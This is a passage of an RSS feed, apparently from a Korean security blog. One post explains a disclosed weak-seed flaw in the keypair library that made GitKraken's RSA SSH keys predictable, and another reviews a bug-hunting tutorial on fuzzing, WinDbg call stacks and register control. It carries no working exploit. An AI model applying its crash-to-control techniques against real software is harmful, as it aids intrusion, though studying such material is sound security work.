      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-1012-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-1012-keypair/">https://securitylab.github.com/advisories/GHSL-2021-1012-keypair/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>GitKraken 7.6.x, 7.7.x, 8.0.0 &#xBC84;&#xC804;&#xC758; SSH key&#xB97C; &#xBC1C;&#xAE09;&#xBC1B;&#xC740; &#xC720;&#xC800;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>JS&#xC5D0;&#xC11C; RSA &#xC554;&#xD638;&#xD654; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xAD6C;&#xD604;&#xD55C; keypair&#xC5D0;&#xC11C; SSH&#xC758; RSA &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC798;&#xBABB;&#xB41C; &#xB09C;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Keypair&#xB294; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; CSPRNG(&#xB610;&#xB294; CPRNG)&#xC5D0; &#xC644;&#xC804;&#xD788; &#xC758;&#xC9C0;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xC790;&#xCCB4; &#xCE74;&#xC6B4;&#xD130; &#xAE30;&#xBC18;&#xC758; CMAC &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. </p><blockquote><p>CSPRNG(Cryptographically secure PRNG) : &#xB09C;&#xC218;&#xB97C; &#xD749;&#xB0B4;&#xB0B4;&#xAE30; &#xC704;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xC720;&#xC0AC;&#xB09C;&#xC218; &#xC0DD;&#xC131;&#xAE30;(Pseudorandom number generator, PRNG) &#xC911; &#xC554;&#xD638;&#xD559;&#xC801;&#xC73C;&#xB85C; &#xC548;&#xC804;&#xD55C; &#xC720;&#xC0AC;&#xB09C;&#xC218; &#xC0DD;&#xC131;&#xAE30;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xBB38;&#xC81C;&#xB294; &#xC911;&#xBCF5;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130;&#xB85C; CMAC&#xC744; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xC2DC;&#xB4DC; &#xC120;&#xC815; &#xBB38;&#xC81C;&#xC778;&#xB370;, AES-CMAC &#xC0DD;&#xC131;&#xAE30;&#xC758; seed&#xB97C; &#xC704;&#xD574; Keypair&#xB294; NodeJS&#xC5D0;&#xC11C; &#xB450; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C;&#xB294; <code>window.crypto.getRandomValues()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC;,  NodeJS&#xB294; window&#xB77C;&#xB294; &#xAC1D;&#xCCB4;&#xAC00; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC544; AES-CMAC&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><code>window.crypto.getRandomValues()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xC744; &#xB54C;, Lehmer LCG &#xB09C;&#xC218; &#xC0DD;&#xC131;&#xAE30;&#xAC00; CMAC &#xCE74;&#xC6B4;&#xD130; seed&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; LCG&#xB294; <code>Math.random</code>&#xACFC; &#xD568;&#xAED8; seed&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">b.putByte(<span class="hljs-built_in">String</span>.fromCharCode(next &amp; <span class="hljs-number">0xFF</span>))util.ByteBuffer.prototype.putByte = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">b</span>) </span>{  <span class="hljs-built_in">this</span>.data += <span class="hljs-built_in">String</span>.fromCharCode(b);};<span class="hljs-comment">// b.putByte(String.fromCharCode(String.fromCharCode(next &amp; 0xFF)))</span></code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xB2E8;&#xC21C;&#xD654;&#xD558;&#xBA74; <code>String.fromCharCode(String.fromCharCode(next &amp; 0xFF))</code>, &#xC989; &#xC774;&#xC911;(double) <code>String.fromCharCode</code>&#xB85C; &#xC758;&#xB3C4;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC57D;&#xD55C; &#xC2DC;&#xB4DC;&#xC758; &#xC6D0;&#xC778;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>0xFF</code>&#xB85C; and &#xC5F0;&#xC0B0;&#xC744; &#xD55C; &#xACB0;&#xACFC;&#xB85C; &#xCD9C;&#xB825; &#xBC84;&#xD37C;&#xC758; 97%&#xC5D0; 0&#xC774; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/09/d0hwq1/2021-11-09/image1.png" alt="Untitled"></p><p>&#xCD9C;&#xB825;&#xC5D0;&#xC11C; &#xC758;&#xBBF8;&#xC788;&#xB294; &#xAC12;&#xC740; 48~57&#xBC16;&#xC5D0; &#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; RNG &#xC2DC;&#xB4DC;&#xAC00; 0&#xC77C; &#xD655;&#xB960;&#xC774; 97%&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xBA70;, &#xB9CC;&#xC57D; 0&#xC774; &#xC544;&#xB77C;&#xBA74; &#xBC14;&#xC774;&#xD2B8;&#xB294; 0&#xC5D0;&#xC11C; 9&#xAE4C;&#xC9C0;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xAD6D; Keypair&#xC758; &#xBB38;&#xC81C;&#xC810;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC694;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC548;&#xC804;&#xD55C; CSPRNG&#xAC00; &#xC544;&#xB2CC; &#xCDE8;&#xC57D;&#xD55C; LCG&#xC640; <code>Math.random</code>&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>CSPRNG&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xB3C4; NodeJS&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC2DC;&#xB4DC;&#xC758; &#xB300;&#xBD80;&#xBD84;(&#xC57D; 97%)&#xC774; 0&#xC774; &#xB418;&#xB294; &#xAD6C;&#xD604;&#xC785;&#xB2C8;&#xB2E4;.</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/D0hwQ1/">D0hwQ1</category>
      
      <category domain="https://hackyboiz.github.io/tags/keypair/">keypair</category>
      
      <category domain="https://hackyboiz.github.io/tags/rsa/">rsa</category>
      
      <category domain="https://hackyboiz.github.io/tags/ssh/">ssh</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/09/d0hwq1/2021-11-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 버그헌팅 튜토리얼 리뷰</title>
      <link>https://hackyboiz.github.io/2021/11/07/juntheworld/bughunting-tutorial-review/</link>
      <guid>https://hackyboiz.github.io/2021/11/07/juntheworld/bughunting-tutorial-review/</guid>
      <pubDate>Sun, 07 Nov 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;[Research] &amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC;&amp;#xC744; &amp;#xBCF4;&amp;#xACE0; &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xB358; &amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<p>[Research] &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC;&#xC744; &#xBCF4;&#xACE0; &#xACF5;&#xBD80;&#xD558;&#xB358; &#xB3C4;&#xC911; &#xAD81;&#xAE08;&#xD588;&#xB358; &#xC810;&#xACFC; &#xB2F5;&#xBCC0;&#xC73C;&#xB85C; &#xC0C8;&#xB85C; &#xC54C;&#xAC8C; &#xB41C; &#xC810;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xBC84;&#xADF8;&#xD5CC;&#xD305;-&#xD29C;&#xD1A0;&#xB9AC;&#xC5BC;-&#xBCF4;&#xB7EC;&#xAC00;&#xAE30;"><a href="#&#xBC84;&#xADF8;&#xD5CC;&#xD305;-&#xD29C;&#xD1A0;&#xB9AC;&#xC5BC;-&#xBCF4;&#xB7EC;&#xAC00;&#xAE30;" class="headerlink" title="&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;"></a>&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 2</a></p><p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 3</a></p><p><a href="https://hackyboiz.github.io/2021/03/31/l0ch/bughunting-tutorials-part4/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 4</a></p><h1 id="Q1-&#xD37C;&#xC9D5;-&#xC774;&#xC804;-&#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC744;-&#xC218;&#xC815;&#xD558;&#xB294;-&#xC774;&#xC720;"><a href="#Q1-&#xD37C;&#xC9D5;-&#xC774;&#xC804;-&#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC744;-&#xC218;&#xC815;&#xD558;&#xB294;-&#xC774;&#xC720;" class="headerlink" title="Q1. &#xD37C;&#xC9D5; &#xC774;&#xC804; &#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC744; &#xC218;&#xC815;&#xD558;&#xB294; &#xC774;&#xC720;"></a>Q1. &#xD37C;&#xC9D5; &#xC774;&#xC804; &#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC744; &#xC218;&#xC815;&#xD558;&#xB294; &#xC774;&#xC720;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915222248949.png" alt="./bughunting-tutorial-review/image-20210915222248949"></p><ol><li>&#xCD94;&#xD6C4; &#xD06C;&#xB798;&#xC26C; &#xBD84;&#xC11D;&#xC2DC;&#xC5D0; &#xB0B4; &#xD30C;&#xC77C;&#xC774; <strong>&#xC5B4;&#xB514;&#xC5D0; &#xB85C;&#xB4DC; &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;</strong>&#xD558;&#xAE30; &#xD3B8;&#xD55C; &#xC774;&#xC720;<ul><li>&#xB514;&#xBC84;&#xAC70;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; string search&#xB97C; &#xD1B5;&#xD574; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xB0B4;&#xAC00; &#xC218;&#xC815;&#xD55C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC5B4;&#xB290; &#xC704;&#xCE58;&#xC5D0; &#xC62C;&#xB77C;&#xAC00;&#xB294;&#xC9C0; &#xD3B8;&#xD558;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xB610; &#xB9C8;&#xC9C0;&#xB9C9; &#xBD80;&#xBD84;&#xC5D0; &#xB123;&#xC744; &#xACBD;&#xC6B0; <strong>&#xB05D;&#xAE4C;&#xC9C0; &#xB2E4; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB3C4; &#xC54C;&#xAE30; &#xC27D;&#xB2E4;.</strong> &#xB77C;&#xACE0; &#xC5B8;&#xAE09;&#xB418;&#xC5B4;&#xC788;&#xB294;&#xB370;, &#xB85C;&#xB4DC;&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC774; &#xC5B4;&#xB5A4; &#xAC83;&#xC778;&#xC9C0;? (&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB85C;&#xB4DC;? &#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC774; &#xD37C;&#xC800;&#xC5D0; &#xB85C;&#xB4DC;?) <ul><li>&#xC774;&#xBBF8;&#xC9C0; &#xD30C;&#xC77C;&#xC774; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xAC83;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC774; &#xB05D;&#xAE4C;&#xC9C0; &#xB2E4; &#xB85C;&#xB4DC;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xB294;&#xC9C0;?<ul><li>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB9C8;&#xB2E4; &#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h1 id="Q2-ECX-&#xAC12;&#xC774;-&#xD30C;&#xC77C;&#xC5D0;-&#xC800;&#xC7A5;"><a href="#Q2-ECX-&#xAC12;&#xC774;-&#xD30C;&#xC77C;&#xC5D0;-&#xC800;&#xC7A5;" class="headerlink" title="Q2. ECX &#xAC12;&#xC774; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;"></a>Q2. ECX &#xAC12;&#xC774; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915222312219.png" alt="./bughunting-tutorial-review/image-20210915222312219"></p><ol><li><p>ecx &#xAC12;&#xC774; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBB34;&#xC5C7;&#xC744; &#xBCF4;&#xACE0; &#xD310;&#xB2E8;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;</p></li><li><p>ecx &#xAC12;&#xC744; &#xCEE8;&#xD2B8;&#xB864; &#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xC54C; &#xC218; &#xC788;&#xB294;&#xC9C0;</p></li><li><p>&#xB610; ecx&#xAC12;&#xC774; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4;&#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC5B4;&#xB5A4; &#xC758;&#xBBF8;&#xC778;&#xC9C0;</p></li><li>ecx&#xAC12;&#xC774; &#xCEE8;&#xD2B8;&#xB864; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0; </li></ol><ul><li>&#xD5E5;&#xC2A4; &#xC5D0;&#xB514;&#xD130; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xD30C;&#xC77C;&#xC5D0;&#xB2E4; &#xBB38;&#xC790;&#xC5F4; &#xD328;&#xD134;&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xB2E4;&#xC2DC; &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC; &#xC2DC;&#xD0A4;&#xBA74; ecx&#xAC12;&#xC774; &#xD328;&#xD134;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB2E4;&#xBA74; &#xCEE8;&#xD2B8;&#xB864;&#xC744; &#xC27D;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC81C;&#xAC00; &#xC54C;&#xAE30;&#xB85C;&#xB294; ecx &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; &#xBA85;&#xB839;&#xC5B4; &#xC0AC;&#xC6A9;&#xC2DC; &#xBC18;&#xBCF5; &#xCE74;&#xC6B4;&#xD130;&#xC758; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xC54C;&#xACE0;&#xC788;&#xB294;&#xB370;, &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC758; &#xD750;&#xB984;&#xC744; &#xC870;&#xC808;&#xD560; &#xC218; &#xC788;&#xB294; eip, esp, ebp &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xC544;&#xB2CC; ecx &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xB2F4;&#xAE34; &#xAC12;&#xC744; &#xCEE8;&#xD2B8;&#xB864; &#xD560; &#xC218; &#xC788;&#xC744;&#xB54C;&#xB3C4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xC5B4;&#xB5A4; &#xC6D0;&#xB9AC;&#xB85C; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC778;&#xC9C0; &#xC798; &#xC774;&#xD574;&#xAC00; &#xAC00;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li>call ecx &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; eip&#xAC00; ecx &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xBC14;&#xB00C;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCF54;&#xB4DC;&#xC758; &#xD750;&#xB984;&#xC744; &#xB9C8;&#xC74C;&#xB300;&#xB85C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </li></ul></li></ul><h1 id="Q3-Windbg&#xC5D0;&#xC11C;-&#xCF5C;&#xC2A4;&#xD0DD;-&#xBCF4;&#xB294;&#xBC95;"><a href="#Q3-Windbg&#xC5D0;&#xC11C;-&#xCF5C;&#xC2A4;&#xD0DD;-&#xBCF4;&#xB294;&#xBC95;" class="headerlink" title="Q3. Windbg&#xC5D0;&#xC11C; &#xCF5C;&#xC2A4;&#xD0DD; &#xBCF4;&#xB294;&#xBC95;"></a>Q3. Windbg&#xC5D0;&#xC11C; &#xCF5C;&#xC2A4;&#xD0DD; &#xBCF4;&#xB294;&#xBC95;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915222328034.png" alt="./bughunting-tutorial-review/image-20210915222328034"></p><ol><li>Windbg&#xC5D0;&#xC11C; &#xB098;&#xD0C0;&#xB294; <code>IMLodader + 0x357c</code>&#xC640; &#xAC19;&#xC740; &#xAC12;&#xC774; &#xC5B4;&#xB5A4; &#xAC83;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294;&#xAC74;&#xC9C0;? (&#xD568;&#xC218; &#xC2DC;&#xC791;&#xBD80;&#xBD84;? &#xD568;&#xC218;&#xB0B4;&#xC758; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158; &#xC8FC;&#xC18C;? &#xBD84;&#xAE30;&#xD560;&#xB54C;&#xC758; &#xADF8; &#xC8FC;&#xC18C;?)<ul><li>&#xD568;&#xC218;&#xB0B4;&#xC5D0;&#xC11C; &#xB2E4;&#xB978; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xB2E4;&#xC74C; &#xC2E4;&#xD589; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xD638;&#xCD9C;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xB05D;&#xB09C; &#xB4A4; &#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC624;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xCF5C;&#xC2A4;&#xD0DD; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4; &#xD639;&#xC740; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD558;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xBB34;&#xC5C7;&#xC778;&#xC9C0;?<ul><li>&#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD06C;&#xB798;&#xC26C; &#xBC1C;&#xC0DD; &#xC9C0;&#xC810; &#xC774;&#xC804;&#xC5D0; &#xC5B4;&#xB514;&#xC11C; &#xD30C;&#xC77C;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xB294;&#xC9C0; &#xB4F1; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xCF5C;&#xC2A4;&#xD0DD;&#xC774; &#xAE68;&#xC838;&#xC788;&#xB294;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xD310;&#xB2E8;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;<ul><li>&#xB300;&#xCCB4;&#xB85C; Warning&#xC774;&#xB77C;&#xACE0; &#xC54C;&#xB824;&#xC8FC;&#xBA70; &#xC2A4;&#xD0DD;&#xC774; &#xC624;&#xC5FC;&#xB418;&#xC5B4; kb &#xBA85;&#xB839;&#xC5B4; &#xC785;&#xB825; &#xC2DC; &#xC774;&#xC0C1;&#xD558;&#xAC8C; &#xB5A0; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xB4F1; &#xD310;&#xB2E8;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h1 id="Q4-&#xB9AC;&#xBC84;&#xC2F1;-&#xC2DC;&#xC5D0;-&#xBE44;&#xD2B8;&#xB9F5;-&#xBD80;&#xBD84;&#xC744;-&#xBAA8;&#xB450;-0x41&#xB85C;-&#xBC14;&#xAFB8;&#xB294;-&#xC774;&#xC720;"><a href="#Q4-&#xB9AC;&#xBC84;&#xC2F1;-&#xC2DC;&#xC5D0;-&#xBE44;&#xD2B8;&#xB9F5;-&#xBD80;&#xBD84;&#xC744;-&#xBAA8;&#xB450;-0x41&#xB85C;-&#xBC14;&#xAFB8;&#xB294;-&#xC774;&#xC720;" class="headerlink" title="Q4. &#xB9AC;&#xBC84;&#xC2F1; &#xC2DC;&#xC5D0; &#xBE44;&#xD2B8;&#xB9F5; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB450; 0x41&#xB85C; &#xBC14;&#xAFB8;&#xB294; &#xC774;&#xC720;"></a>Q4. &#xB9AC;&#xBC84;&#xC2F1; &#xC2DC;&#xC5D0; &#xBE44;&#xD2B8;&#xB9F5; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB450; 0x41&#xB85C; &#xBC14;&#xAFB8;&#xB294; &#xC774;&#xC720;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915223000840.png" alt="./bughunting-tutorial-review/image-20210915223000840"></p><ol><li><p>&#xBE44;&#xD2B8;&#xB9F5; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB450; 0x41&#xB85C; &#xBC14;&#xAFBC; &#xB2E4;&#xC74C; &#xB2E4;&#xC2DC; &#xB514;&#xBC84;&#xAC70;&#xB85C; &#xD655;&#xC778;&#xD558;&#xC2E0;&#xB2E4;&#xACE0; &#xD558;&#xC168;&#xB294;&#xB370;, &#xADF8;&#xB7EC;&#xBA74;&#xC740; &#xD06C;&#xB798;&#xC2DC; &#xBC1C;&#xC0DD;&#xC744; &#xC720;&#xBC1C;&#xD588;&#xB358; &#xBBA4;&#xD14C;&#xC774;&#xD2B8; &#xB41C; &#xBD80;&#xBD84;&#xC740; &#xADF8;&#xB300;&#xB85C; &#xB450;&#xACE0; &#xB098;&#xBA38;&#xC9C0; &#xBD80;&#xBD84;&#xC744; &#xC804;&#xCCB4;&#xB85C; 0x41&#xB85C; &#xCC44;&#xC6B4; &#xAC83;&#xC778;&#xAC00;&#xC694;?</p><ul><li>&#xD5E4;&#xB354;&#xB294; &#xD06C;&#xB798;&#xC26C;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xD5E4;&#xB354; &#xADF8;&#xB300;&#xB85C; &#xB450;&#xACE0; &#xB098;&#xBA38;&#xC9C0; &#xB0B4;&#xC6A9;&#xC744; 0x41&#xB85C; &#xCC44;&#xC6C1;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xC5B4;&#xB5A0;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xAE30; &#xC704;&#xD574;&#xC11C; 0x41&#xB85C; &#xC804;&#xBD80; &#xBC14;&#xAFBC;&#xB4A4;&#xC5D0; &#xB2E4;&#xC2DC; &#xC2E4;&#xD589;&#xC744; &#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC778;&#xC9C0;? (eax&#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;..? &#xAC12;&#xC774; 0x41&#xB85C; &#xBC14;&#xB00C;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#x2026;? &#xC81C;&#xAC00; &#xB098;&#xB984;&#xB300;&#xB85C; &#xB0B4;&#xB9B0; &#xACB0;&#xB860;&#xC740;, &#xD06C;&#xB798;&#xC26C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC2DC;&#xC810;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xBC14;&#xAFBC; &#xC815;&#xBCF4;(&#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xBE44;&#xD2B8;&#xB9F5; &#xC815;&#xBCF4;)&#xB85C; &#xB9D0;&#xBBF8;&#xC554;&#xC544; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xAC8C; &#xB418;&#xB294; 